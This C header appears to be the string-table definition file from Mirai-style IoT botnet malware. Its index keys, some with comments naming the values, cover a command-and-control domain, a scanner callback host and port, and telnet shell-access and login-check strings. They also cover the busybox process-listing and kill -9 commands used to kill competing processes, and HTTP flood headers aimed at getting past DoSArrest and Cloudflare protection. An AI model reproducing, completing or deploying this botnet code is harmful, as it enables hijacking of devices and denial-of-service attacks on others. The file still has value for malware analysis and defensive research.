#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

#define TABLE_EXEC_SUCCESS          1

#define TABLE_WATCHDOG1             2
#define TABLE_WATCHDOG2             3
#define TABLE_WATCHDOG3             4

#define TABLE_KILLER_TCP            5
#define TABLE_KILLER_PROC           6
#define TABLE_KILLER_EXE            7
#define TABLE_KILLER_FD             8
#define TABLE_KILLER_CMDLINE        9
#define TABLE_KILLER_SOFIA          10

#define TABLE_ATK_VSE               11
#define TABLE_ATK_RESOLVER          12
#define TABLE_ATK_NSERV             13

#define TABLE_HTTP_ONE              14
#define TABLE_HTTP_TWO              15
#define TABLE_HTTP_THREE            16
#define TABLE_HTTP_FOUR             17
#define TABLE_HTTP_FIVE             18

/* Scanner data */          
#define TABLE_SCAN_CB_DOMAIN            19  /* domain to connect to */
#define TABLE_SCAN_CB_PORT              20  /* Port to connect to */
#define TABLE_SCAN_SHELL                21  /* 'shell' to enable shell access */
#define TABLE_SCAN_ENABLE               22  /* 'enable' to enable shell access */
#define TABLE_SCAN_SYSTEM               23  /* 'system' to enable shell access */
#define TABLE_SCAN_SH                   24 /* 'sh' to enable shell access */
#define TABLE_SCAN_QUERY                25  /* echo hex string to verify login */
#define TABLE_SCAN_RESP                 26  /* utf8 version of query string */
#define TABLE_SCAN_NCORRECT             27  /* 'ncorrect' to fast-check for invalid password */
#define TABLE_SCAN_PS                   28  /* "/bin/busybox ps" */
#define TABLE_SCAN_KILL_9               29  /* "/bin/busybox kill -9 " */

#define TABLE_ATK_KEEP_ALIVE            30  /* "Connection: keep-alive" */
#define TABLE_ATK_ACCEPT                31  // "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" // */
#define TABLE_ATK_ACCEPT_LNG            32  // "Accept-Language: en-US,en;q=0.8"
#define TABLE_ATK_CONTENT_TYPE          33  // "Content-Type: application/x-www-form-urlencoded"
#define TABLE_ATK_SET_COOKIE            34  // "setCookie('"
#define TABLE_ATK_REFRESH_HDR           35  // "refresh:"
#define TABLE_ATK_LOCATION_HDR          36  // "location:"
#define TABLE_ATK_SET_COOKIE_HDR        37  // "set-cookie:"
#define TABLE_ATK_CONTENT_LENGTH_HDR    38  // "content-length:"
#define TABLE_ATK_TRANSFER_ENCODING_HDR 39  // "transfer-encoding:"
#define TABLE_ATK_CHUNKED               40  // "chunked"
#define TABLE_ATK_KEEP_ALIVE_HDR        41  // "keep-alive"
#define TABLE_ATK_CONNECTION_HDR        42  // "connection:"
#define TABLE_ATK_DOSARREST             43  // "server: dosarrest"
#define TABLE_ATK_CLOUDFLARE_NGINX      44  // "server: cloudflare-nginx"

#define TABLE_CNC_DOMAIN            45
#define TABLE_KILLER_MAPS           46
#define TABLE_KILLER_COMM           47

#define TABLE_MAX_KEYS              48

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t);
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
